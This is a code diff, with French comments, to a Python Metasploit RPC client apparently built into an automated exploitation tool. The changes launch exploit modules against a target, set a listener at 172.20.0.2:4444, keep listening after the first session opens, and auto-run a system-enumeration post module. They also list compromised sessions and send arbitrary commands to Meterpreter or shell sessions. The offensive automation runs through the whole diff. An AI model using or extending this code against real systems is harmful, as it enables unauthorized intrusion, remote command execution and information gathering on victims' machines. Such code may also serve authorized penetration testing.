@@ -274,71 +274,142 @@ class MetasploitRPCClient:
             }
     
     def get_sessions(self):
-        """Liste toutes les sessions actives via RPC"""
+        """Liste toutes les sessions actives via RPC - VERSION CORRIGÉE"""
         try:
+            logger.info("🎯 Récupération sessions via RPC...")
             result = self.call('session.list')
-            if result:
-                sessions = []
-                for session_id, session_data in result.items():
-                    sessions.append({
-                        'session_id': str(session_id),
+            
+            if not result:
+                logger.warning("⚠️ Aucune session retournée par RPC")
+                return {
+                    'success': True,
+                    'sessions': []
+                }
+            
+            sessions = []
+            for session_id, session_data in result.items():
+                # ✅ CORRECTION 4: Validation des données de session
+                try:
+                    session_id_int = int(session_id)  # Vérifier que l'ID est valide
+                    
+                    session_info = {
+                        'session_id': str(session_id),  # Garder comme string pour cohérence
                         'session_type': session_data.get('type', 'unknown'),
                         'target_ip': session_data.get('session_host', 'unknown'),
                         'target_port': session_data.get('session_port'),
                         'platform': session_data.get('platform', 'unknown'),
                         'via_exploit': session_data.get('via_exploit', 'unknown'),
                         'tunnel_peer': session_data.get('tunnel_peer', 'unknown'),
-                        'status': 'active'
-                    })
-                
-                logger.info(f"🎯 {len(sessions)} sessions actives trouvées via RPC")
-                return {
-                    'success': True,
-                    'sessions': sessions
-                }
+                        'status': 'active',
+                        'arch': session_data.get('arch', 'unknown'),
+                        'username': session_data.get('username', 'unknown')
+                    }
+                    
+                    sessions.append(session_info)
+                    logger.debug(f"📊 Session RPC #{session_id}: {session_info['session_type']} -> {session_info['target_ip']}")
+                    
+                except (ValueError, KeyError) as e:
+                    logger.warning(f"⚠️ Session RPC invalide #{session_id}: {e}")
+                    continue
             
+            logger.info(f"🎯 {len(sessions)} sessions actives trouvées via RPC")
             return {
                 'success': True,
-                'sessions': []
+                'sessions': sessions
             }
             
         except Exception as e:
-            logger.error(f"❌ Erreur récupération sessions: {e}")
+            logger.error(f"❌ Erreur récupération sessions RPC: {e}")
             return {
                 'success': False,
                 'error': str(e),
                 'sessions': []
             }
-    
+
+
     def execute_session_command(self, session_id, command):
-        """Exécute une commande sur une session spécifique via RPC"""
+        """Exécute une commande sur une session spécifique via RPC - VERSION CORRIGÉE"""
         try:
-            # Convertir session_id en int si nécessaire
-            session_id = int(session_id) if isinstance(session_id, str) else session_id
+            # ✅ CORRECTION 1: Validation et conversion de l'ID
+            if isinstance(session_id, str):
+                try:
+                    session_id = int(session_id)
+                except ValueError:
+                    logger.error(f"❌ ID session invalide: '{session_id}' - doit être numérique")
+                    return {
+                        'success': False,
+                        'session_id': str(session_id),
+                        'command': command,
+                        'error': f'ID session invalide: {session_id}'
+                    }
             
-            # Écrire la commande dans la session
-            self.call('session.shell_write', session_id, command + '\n')
+            logger.info(f"🔧 Commande RPC session #{session_id}: {command}")
             
-            # Attendre la réponse
-            time.sleep(2)
+            # ✅ CORRECTION 2: Vérifier que la session existe avant d'exécuter
+            session_list = self.call('session.list')
+            if not session_list or str(session_id) not in session_list:
+                logger.error(f"❌ Session #{session_id} non trouvée dans Metasploit")
+                return {
+                    'success': False,
+                    'session_id': str(session_id),
+                    'command': command,
+                    'error': f'Session #{session_id} non trouvée'
+                }
             
-            # Lire la réponse
-            result = self.call('session.shell_read', session_id)
+            # ✅ CORRECTION 3: Utiliser la méthode RPC correcte selon le type de session
+            session_info = session_list[str(session_id)]
+            session_type = session_info.get('type', 'shell')
             
-            if result and 'data' in result:
-                output = result['data']
+            if session_type == 'meterpreter':
+                # Pour Meterpreter, utiliser session.meterpreter_write/read
+                write_result = self.call('session.meterpreter_write', session_id, command + '\n')
+                
+                if not write_result or write_result.get('result') != 'success':
+                    return {
+                        'success': False,
+                        'session_id': str(session_id),
+                        'command': command,
+                        'error': 'Échec écriture commande Meterpreter'
+                    }
+                
+                # Attendre la réponse
+                time.sleep(2)
+                
+                # Lire la réponse
+                read_result = self.call('session.meterpreter_read', session_id)
+                output = read_result.get('data', '') if read_result else 'Pas de sortie'
+                
             else:
-                output = 'Commande exécutée (pas de sortie visible)'
+                # Pour les shells standards, utiliser session.shell_write/read
+                write_result = self.call('session.shell_write', session_id, command + '\n')
+                
+                if not write_result or write_result.get('result') != 'success':
+                    return {
+                        'success': False,
+                        'session_id': str(session_id),
+                        'command': command,
+                        'error': 'Échec écriture commande Shell'
+                    }
+                
+                # Attendre la réponse
+                time.sleep(2)
+                
+                # Lire la réponse
+                read_result = self.call('session.shell_read', session_id)
+                output = read_result.get('data', '') if read_result else 'Pas de sortie'
+            
+            logger.info(f"✅ Commande exécutée sur session #{session_id} (type: {session_type})")
             
             return {
                 'success': True,
                 'session_id': str(session_id),
+                'session_type': session_type,
                 'command': command,
                 'output': output
             }
             
         except Exception as e:
-            logger.error(f"❌ Erreur commande session {session_id}: {e}")
+            logger.error(f"❌ Erreur commande RPC session {session_id}: {e}")
             return {
                 'success': False,
                 'session_id': str(session_id),
@@ -347,39 +418,76 @@ class MetasploitRPCClient:
             }
     
     def run_exploit(self, exploit_module, options, target, port):
-        """Lance un exploit via la console persistante"""
+        """Lance un exploit via la console persistante - VERSION CORRIGÉE"""
         try:
+            # ✅ CORRECTION 5: Commandes améliorées pour assurer les sessions
             commands = [
                 f"use {exploit_module}",
                 f"set RHOSTS {target}",
                 f"set RPORT {port}",
-                f"set LHOST 172.20.0.2",  # IP fixe du conteneur
-                f"set LPORT 4444"
+                f"set LHOST 172.20.0.2",
+                f"set LPORT 4444",
+                "set ExitOnSession false",  # ✅ CRUCIAL: Ne pas fermer à la première session
+                "set AutoRunScript post/multi/gather/enum_system"  # ✅ Script automatique
             ]
             
-            # Ajouter les options
+            # Ajouter les options utilisateur
             for key, value in options.items():
-                if key.upper() not in ['MODE', 'SCAN_TYPE']:  # Exclure les options non-MSF
+                if key.upper() not in ['MODE', 'SCAN_TYPE', 'EXPLICIT_MODULE']:
                     commands.append(f"set {key.upper()} {value}")
             
+            # ✅ CORRECTION 6: Utiliser 'exploit -z' pour arrière-plan
             commands.extend([
-                "exploit -z",  # -z pour arrière-plan
-                "sleep 2",     # Attendre un peu
-                "sessions -l"   # Lister les sessions
+                "exploit -z",     # -z pour arrière-plan, ne pas interagir
+                "sleep 3",        # Attendre plus longtemps
+                "sessions -l",    # Lister les sessions
+                "sessions -i"     # Informations détaillées des sessions
             ])
             
             output = ""
+            session_created = False
+            
             for cmd in commands:
+                logger.info(f"🔧 Exécution RPC: {cmd}")
                 result = self.execute_console_command(cmd)
+                
                 if result and result.get('success'):
                     cmd_output = result['output']
                     output += f"[CMD] {cmd}\n{cmd_output}\n"
-                    logger.info(f"✅ Commande RPC exécutée: {cmd}")
+                    
+                    # ✅ CORRECTION 7: Détecter immédiatement les nouvelles sessions
+                    if 'session' in cmd_output.lower() and 'opened' in cmd_output.lower():
+                        session_created = True
+                        logger.info(f"🎯 Session détectée dans la sortie: {cmd_output}")
+                    
                 else:
                     logger.error(f"❌ Échec commande RPC: {cmd}")
+                    output += f"[ERROR] {cmd}\n{result.get('error', 'Erreur inconnue')}\n"
             
-            # Parser les sessions depuis la sortie
-            sessions = self._parse_sessions_from_output(output)
+            # ✅ CORRECTION 8: Vérifier les sessions via RPC après exploitation
+            sessions_after = self.get_sessions()
+            sessions_list = sessions_after.get('sessions', [])
+            
+            # Parser les sessions depuis la sortie ET depuis RPC
+            console_sessions = self._parse_sessions_from_output(output)
+            
+            # Combiner les deux sources de sessions
+            all_sessions = []
+            session_ids_seen = set()
+            
+            # D'abord, les sessions du RPC (plus fiables)
+            for session in sessions_list:
+                if session['session_id'] not in session_ids_seen:
+                    all_sessions.append(session)
+                    session_ids_seen.add(session['session_id'])
+            
+            # Puis, les sessions détectées dans la console (si nouvelles)
+            for session in console_sessions:
+                if session['session_id'] not in session_ids_seen:
+                    all_sessions.append(session)
+                    session_ids_seen.add(session['session_id'])
+            
+            logger.info(f"🎯 Total sessions trouvées: {len(all_sessions)}")
             
             return {
                 'success': True,
@@ -387,10 +495,11 @@ class MetasploitRPCClient:
                 'target': f"{target}:{port}",
                 'raw_output': output,
                 'parsed_result': {
-                    'sessions_opened': len(sessions),
-                    'sessions_detected': sessions,
+                    'sessions_opened': len(all_sessions),
+                    'sessions_detected': all_sessions,
                     'exploit_attempted': True,
-                    'status': 'exploited' if sessions else 'completed'
+                    'status': 'exploited' if all_sessions else 'completed',
+                    'session_created': session_created
                 }
             }
             
@@ -402,7 +511,7 @@ class MetasploitRPCClient:
                 'module': exploit_module,
                 'target': f"{target}:{port}"
             }
-    
+
     def _parse_sessions_from_output(self, output):
         """Parse les sessions depuis la sortie console"""
         sessions = []
